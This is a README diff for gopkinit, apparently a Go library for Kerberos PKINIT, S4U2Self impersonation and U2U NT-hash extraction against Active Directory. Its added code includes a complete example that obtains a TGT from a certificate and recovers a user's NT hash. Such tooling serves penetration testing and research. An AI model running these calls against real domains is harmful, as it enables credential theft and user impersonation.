@@ -113,6 +113,378 @@ $ export KRB5CCNAME=output.ccache
 $ smbclient.py -k target.domain.com
 ```
 
+## Library Usage
+
+The gopkinit packages can be used as a library in your own Go projects. Each package provides clean APIs for specific Kerberos functionality.
+
+### Installing the Library
+
+```bash
+go get github.com/ineffectivecoder/gopkinit
+```
+
+### Package Overview
+
+| Package | Description |
+|---------|-------------|
+| `pkg/pkinit` | PKINIT client for certificate-based TGT requests |
+| `pkg/s4u` | S4U2Self client for user impersonation |
+| `pkg/u2u` | User-to-User client for NT hash extraction |
+| `pkg/ccache` | MIT Kerberos ccache file read/write |
+| `pkg/krb` | Low-level KDC communication and TGS handling |
+| `pkg/pac` | PAC (Privilege Attribute Certificate) parsing |
+| `pkg/cert` | PFX/PKCS12 certificate loading |
+
+---
+
+### pkinit - Certificate-Based Authentication
+
+The `pkinit` package implements RFC 4556 PKINIT for obtaining TGTs using X.509 certificates.
+
+```go
+import "github.com/ineffectivecoder/gopkinit/pkg/pkinit"
+
+// Create client from PFX file
+client, err := pkinit.NewFromPFX("user.pfx", "password")
+if err != nil {
+    log.Fatal(err)
+}
+
+// Or create client from PFX bytes (useful for embedded certs)
+pfxData, _ := os.ReadFile("user.pfx")
+client, err := pkinit.NewFromPFXData(pfxData, "password")
+
+// Request TGT from KDC
+// Parameters: domain, username, kdcAddress, proxyAddress (empty for no proxy)
+result, err := client.GetTGT("DOMAIN.COM", "username", "dc.domain.com", "")
+if err != nil {
+    log.Fatal(err)
+}
+
+// Access results
+fmt.Printf("AS-REP Key: %s\n", result.ASRepKey)        // Hex string, needed for getnthash
+fmt.Printf("Session Key Type: %d\n", result.SessionKey.KeyType)
+fmt.Printf("Ticket Realm: %s\n", result.Realm)
+
+// Access the certificate info
+cert := client.GetCertificate()
+fmt.Printf("Certificate Subject: %s\n", cert.Subject.CommonName)
+fmt.Printf("Issuer: %s\n", client.GetIssuer())
+```
+
+**TGTResult Fields**:
+- `Ticket` - The Kerberos ticket (gokrb5 messages.Ticket)
+- `EncPart` - Decrypted AS-REP encrypted part
+- `SessionKey` - TGT session key for subsequent requests
+- `ASRepKey` - Hex-encoded key for PAC credential decryption (used by getnthash)
+- `Realm` - Client realm
+- `CName` - Client principal name
+
+---
+
+### s4u - S4U2Self Impersonation
+
+The `s4u` package implements S4U2Self (Service-for-User-to-Self) for obtaining service tickets on behalf of other users.
+
+```go
+import "github.com/ineffectivecoder/gopkinit/pkg/s4u"
+
+// Create client from ccache file containing a TGT
+client, err := s4u.NewS4U2SelfClient("admin.ccache", "dc.domain.com")
+if err != nil {
+    log.Fatal(err)
+}
+
+// Request impersonated service ticket
+// Parameters: targetUser, targetRealm, serviceName, serviceRealm, outputPath
+err = client.GetS4U2SelfTicket(
+    "targetuser",           // User to impersonate
+    "DOMAIN.COM",           // Target user's realm
+    "cifs/fileserver",      // Service principal name
+    "DOMAIN.COM",           // Service realm
+    "impersonated.ccache",  // Output file
+)
+if err != nil {
+    // Error 16 (KDC_ERR_PADATA_TYPE_NOSUPP) indicates delegation not enabled
+    log.Fatal(err)
+}
+
+fmt.Println("Impersonated ticket saved to impersonated.ccache")
+```
+
+**Requirements**:
+- The account whose TGT is in the ccache must have delegation privileges
+- The target user must be delegatable (not marked as "sensitive")
+
+---
+
+### u2u - NT Hash Extraction
+
+The `u2u` package implements User-to-User authentication to extract NT hashes from PKINIT TGTs.
+
+```go
+import (
+    "encoding/hex"
+    "github.com/ineffectivecoder/gopkinit/pkg/u2u"
+)
+
+// Decode AS-REP key from gettgtpkinit output
+asrepKey, _ := hex.DecodeString("c0ffee1234567890abcdef1234567890c0ffee1234567890abcdef1234567890")
+
+// Create U2U client
+client, err := u2u.NewU2UClient("user.ccache", "dc.domain.com", asrepKey)
+if err != nil {
+    log.Fatal(err)
+}
+
+// Extract NT hash
+ntHash, err := client.GetNTHash()
+if err != nil {
+    // Common errors:
+    // - "PAC_CREDENTIAL_INFO not found" = TGT not from PKINIT
+    // - "failed to decrypt PAC credentials" = wrong AS-REP key
+    log.Fatal(err)
+}
+
+fmt.Printf("NT Hash: %x\n", ntHash)
+```
+
+**How it works**:
+1. Sends U2U TGS-REQ to request a ticket encrypted with our own TGT session key
+2. Decrypts the returned ticket to access the PAC
+3. Finds PAC_CREDENTIAL_INFO buffer (only present in PKINIT TGTs)
+4. Decrypts credentials using the AS-REP key
+5. Parses NDR-encoded NTLM_SUPPLEMENTAL_CREDENTIAL to extract NT hash
+
+---
+
+### ccache - Credential Cache I/O
+
+The `ccache` package provides MIT Kerberos ccache v4 format reading and writing.
+
+```go
+import "github.com/ineffectivecoder/gopkinit/pkg/ccache"
+
+// Write a ccache file
+err := ccache.WriteCCache(
+    "output.ccache",
+    ticket,          // messages.Ticket
+    encPart,         // messages.EncKDCRepPart
+    sessionKey,      // types.EncryptionKey
+    "DOMAIN.COM",    // realm
+    principalName,   // types.PrincipalName
+)
+
+// Read a ccache file
+cc, err := ccache.ReadCCache("input.ccache")
+if err != nil {
+    log.Fatal(err)
+}
+
+// Access default principal
+fmt.Printf("Principal: %s@%s\n",
+    strings.Join(cc.DefaultPrincipal.Components, "/"),
+    cc.DefaultPrincipal.Realm)
+
+// Get TGT from ccache
+tgt, err := cc.GetTGT()
+if err != nil {
+    log.Fatal("No TGT in ccache")
+}
+
+// Access TGT details
+fmt.Printf("TGT expires: %s\n", tgt.EndTime)
+fmt.Printf("Session key type: %d\n", tgt.Key.KeyType)
+
+// Convert to gokrb5 Ticket for use with other operations
+ticket, err := tgt.ToTicket()
+
+// Convert principal for use with gokrb5
+principalName := tgt.Client.ToPrincipalName()
+```
+
+**CCache struct**:
+- `Version` - File format version (0x0504 for v4)
+- `DefaultPrincipal` - Default principal in the cache
+- `Credentials` - List of cached credentials
+
+**Credential struct**:
+- `Client`, `Server` - Principal structs
+- `Key` - Session key (types.EncryptionKey)
+- `AuthTime`, `StartTime`, `EndTime`, `RenewTill` - Time fields
+- `Ticket` - Raw ticket bytes
+
+---
+
+### krb - KDC Communication
+
+The `krb` package handles low-level communication with Kerberos Distribution Centers.
+
+```go
+import "github.com/ineffectivecoder/gopkinit/pkg/krb"
+
+// Create KDC client
+client := krb.NewKDCClient("dc.domain.com")
+
+// Optional: Configure SOCKS5 proxy
+client.SetProxy("127.0.0.1:1080")
+
+// Send AS-REQ and get AS-REP
+asRepBytes, err := client.SendASReq(asReqBytes)
+if err != nil {
+    log.Fatal(err)
+}
+
+// Send TGS-REQ and get TGS-REP
+tgsRepBytes, err := client.SendTGSReq(tgsReqBytes)
+
+// Parse responses
+asRep, err := krb.ParseASRep(asRepBytes)
+tgsRep, err := krb.ParseTGSRep(tgsRepBytes)
+
+// Decrypt TGS-REP encrypted part
+encPart, err := krb.DecryptTGSRep(tgsRep, sessionKey)
+
+// Build TGS-REQ for service tickets
+tgsReq := &krb.TGSRequest{
+    Realm:      "DOMAIN.COM",
+    CName:      clientPrincipal,
+    TGT:        tgtTicket,
+    SessionKey: sessionKey,
+    SName:      servicePrincipal,
+    SRealm:     "DOMAIN.COM",
+}
+reqBytes, err := tgsReq.BuildTGSReq()
+```
+
+**Features**:
+- Automatic UDP/TCP fallback (UDP for small requests, TCP for large)
+- SOCKS5 proxy support
+- 30-second default timeout
+- Proper TCP framing (4-byte length prefix)
+
+---
+
+### pac - PAC Parsing
+
+The `pac` package parses Windows Privilege Attribute Certificates.
+
+```go
+import "github.com/ineffectivecoder/gopkinit/pkg/pac"
+
+// Parse PAC from authorization data
+pacStruct, err := pac.ParsePAC(pacData)
+if err != nil {
+    log.Fatal(err)
+}
+
+// Find specific buffer types
+credBuf := pacStruct.FindBuffer(pac.PACTypeCredentials)         // Type 2
+logonBuf := pacStruct.FindBuffer(pac.PACTypeKerbValidationInfo) // Type 1
+clientBuf := pacStruct.FindBuffer(pac.PACTypeClientInfo)        // Type 10
+
+// Parse PAC_CREDENTIAL_INFO (for PKINIT TGTs)
+if credBuf != nil {
+    credInfo, err := pac.ParseCredentialInfo(credBuf.Data)
+    fmt.Printf("Encryption Type: %d\n", credInfo.EncryptionType)
+
+    // Decrypt and parse credential data
+    decrypted, _ := crypto.DecryptMessage(credInfo.SerializedData, key, 16)
+    credData, err := pac.ParseCredentialData(decrypted)
+
+    for _, cred := range credData.Credentials {
+        fmt.Printf("NT Hash: %x\n", cred.NTPassword)
+    }
+}
+```
+
+**Buffer Types**:
+- `PACTypeKerbValidationInfo` (1) - User logon information
+- `PACTypeCredentials` (2) - Encrypted credentials (PKINIT only)
+- `PACTypeServerChecksum` (6) - Server signature
+- `PACTypePrivSvrChecksum` (7) - KDC signature
+- `PACTypeClientInfo` (10) - Client name and auth time
+- `PACTypeUPNDNSInfo` (12) - UPN and DNS info
+
+---
+
+### cert - Certificate Loading
+
+The `cert` package handles PFX/PKCS12 certificate loading.
+
+```go
+import "github.com/ineffectivecoder/gopkinit/pkg/cert"
+
+// Load from file
+bundle, err := cert.LoadPFX("user.pfx", "password")
+if err != nil {
+    log.Fatal(err)
+}
+
+// Load from bytes
+pfxData, _ := os.ReadFile("user.pfx")
+bundle, err := cert.LoadPFXData(pfxData, "password")
+
+// Access certificate bundle
+fmt.Printf("Subject: %s\n", bundle.Certificate.Subject.CommonName)
+fmt.Printf("Issuer: %s\n", bundle.Issuer)
+fmt.Printf("Not After: %s\n", bundle.Certificate.NotAfter)
+
+// Use private key for signing
+signer := bundle.PrivateKey.(crypto.Signer)
+```
+
+---
+
+## Complete Library Example
+
+Here's a complete example combining multiple packages to get a TGT and extract the NT hash:
+
+```go
+package main
+
+import (
+    "encoding/hex"
+    "fmt"
+    "log"
+
+    "github.com/ineffectivecoder/gopkinit/pkg/pkinit"
+    "github.com/ineffectivecoder/gopkinit/pkg/u2u"
+)
+
+func main() {
+    // Step 1: Get TGT using PKINIT
+    client, err := pkinit.NewFromPFX("user.pfx", "password")
+    if err != nil {
+        log.Fatalf("Failed to load certificate: %v", err)
+    }
+
+    result, err := client.GetTGT("DOMAIN.COM", "user", "dc.domain.com", "")
+    if err != nil {
+        log.Fatalf("Failed to get TGT: %v", err)
+    }
+    fmt.Printf("Got TGT, AS-REP key: %s\n", result.ASRepKey)
+
+    // Step 2: Save TGT to ccache (gettgtpkinit does this for you)
+    // For library usage, you'd call ccache.WriteCCache here
+
+    // Step 3: Extract NT hash using U2U
+    // Note: In practice, you'd read from the ccache file
+    asrepKey, _ := hex.DecodeString(result.ASRepKey)
+    u2uClient, err := u2u.NewU2UClient("user.ccache", "dc.domain.com", asrepKey)
+    if err != nil {
+        log.Fatalf("Failed to create U2U client: %v", err)
+    }
+
+    ntHash, err := u2uClient.GetNTHash()
+    if err != nil {
+        log.Fatalf("Failed to get NT hash: %v", err)
+    }
+
+    fmt.Printf("Recovered NT Hash: %x\n", ntHash)
+}
+```
+
 ## Features
 
 ### gettgtpkinit
@@ -145,26 +517,26 @@ gopkinit/
 │   ├── getnthash/        # NT hash extraction CLI
 │   └── gets4uticket/     # S4U2Self CLI
 ├── pkg/
-│   ├── cert/             # Certificate loading
+│   ├── cert/             # Certificate loading (PFX/PKCS12)
 │   ├── pkinit/           # PKINIT implementation
-│   │   ├── pkinit.go     # Main client
-│   │   ├── dh.go         # Diffie-Hellman
-│   │   ├── authpack.go   # ASN.1 structures
+│   │   ├── pkinit.go     # Main client, GetTGT()
+│   │   ├── dh.go         # Diffie-Hellman key exchange
+│   │   ├── authpack.go   # RFC 4556 ASN.1 structures
 │   │   ├── cms.go        # CMS/PKCS7 signing
 │   │   ├── asreq.go      # AS-REQ builder
 │   │   └── asrep.go      # AS-REP decryption
 │   ├── krb/              # Kerberos network client
-│   │   ├── client.go     # KDC communication
+│   │   ├── client.go     # KDC communication (TCP/UDP/SOCKS5)
 │   │   └── tgs.go        # TGS-REQ/TGS-REP handling
 │   ├── ccache/           # MIT ccache file I/O
-│   │   ├── ccache.go     # Writer
-│   │   └── reader.go     # Reader
+│   │   ├── ccache.go     # Writer (WriteCCache)
+│   │   └── reader.go     # Reader (ReadCCache, ParseCCache)
 │   ├── s4u/              # S4U2Self implementation
-│   │   └── s4u.go
+│   │   └── s4u.go        # S4U2SelfClient
 │   ├── u2u/              # User-to-User implementation
-│   │   └── u2u.go
+│   │   └── u2u.go        # U2UClient, GetNTHash()
 │   └── pac/              # PAC parsing
-│       └── pac.go
+│       └── pac.go        # ParsePAC, ParseCredentialInfo
 ```
 
 ## Technical Implementation Details
@@ -203,27 +575,6 @@ The U2U implementation extracts NT hashes from PKINIT TGTs:
 3. **Credential Decryption**: Decrypt the PAC_CREDENTIAL_INFO using the AS-REP key with key usage 16
 
 4. **NDR Parsing**: Parse the NDR-encoded PAC_CREDENTIAL_DATA to extract NTLM_SUPPLEMENTAL_CREDENTIAL
-
-## Library Usage
-
-```go
-import "github.com/ineffectivecoder/gopkinit/pkg/pkinit"
-
-// Load certificate from PFX
-client, err := pkinit.NewFromPFX("user.pfx", "password")
-if err != nil {
-    log.Fatal(err)
-}
-
-// Request TGT (last parameter is SOCKS5 proxy, empty string for no proxy)
-result, err := client.GetTGT("DOMAIN.COM", "user", "dc.domain.com", "")
-if err != nil {
-    log.Fatal(err)
-}
-
-// Use result.ASRepKey for getnthash
-fmt.Println("AS-REP Key:", result.ASRepKey)
-```
 
 ## Dependencies
 
